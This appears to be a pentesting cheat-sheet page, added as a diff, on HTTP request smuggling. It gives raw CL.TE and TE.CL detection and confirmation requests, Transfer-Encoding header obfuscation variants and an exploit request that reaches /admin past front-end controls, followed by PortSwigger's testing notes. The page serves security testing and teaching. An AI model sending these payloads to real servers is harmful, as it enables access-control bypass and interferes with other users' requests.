@@ -1,0 +1,212 @@
+---
+title: HTTP Smuggling
+category: Web Application
+order: 122
+---
+
+> **Where to look for HTTP Smuggling**
+
+* Load balanced servers
+
+> **Identification**
+
+**CL.TE: Identification**
+
+CL.TE if there is a delay
+
+{% highlight html %}
+//Finding
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+{% endhighlight %}
+
+**CL.TE: Confirmation**
+
+{% highlight html %}
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+{% endhighlight %}
+
+Subsequent "normal" request to look like this:
+
+{% highlight html %}
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+{% endhighlight %}
+
+**TE.CL: Identification**
+
+TE.CL if there is a delay
+
+{% highlight html %}
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+{% endhighlight %}
+
+
+**TE.CL: Confirmation**
+
+**Note chunk size is the total character after the size not including the first
+CRLF after the size or the CRLF after the end.  The CR and LF are counted seperately.**
+
+{% highlight html %}
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+{% endhighlight %}
+
+**CL.TE: Confirmation**
+
+{% highlight html %}
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 50
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+{% endhighlight %}
+
+Subsequent "normal" request to look like this:
+
+{% highlight html %}
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+{% endhighlight %}
+
+CL.TE:
+
+{% highlight html %}
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+
+CL.TE if there is a delay
+{% endhighlight %}
+
+> **Header Obfuscation**
+
+{% highlight html %}
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+{% endhighlight %}
+
+> **Exploit 1: Access Control**
+
+Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack:
+
+
+{% highlight html %}
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+{% endhighlight %}
+
+{% highlight html %}
+POST / HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 74
+Transfer-Encoding: chunked
+
+0
+
+POST /admin HTTP/1.1
+Host: localhost
+Content-Length: 100
+
+x=2
+
+{% endhighlight %}
+
+> **Notes for Exploitation from Portswigger**
+
+Some important considerations should be kept in mind when attempting to confirm request smuggling vulnerabilities via interference with other requests:
+
+* The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
+* The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
+* When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
+* In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
+* If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.
+
+> **Resources**
+
+* [Portswigger - Smuggling](https://portswigger.net/web-security/request-smuggling/)
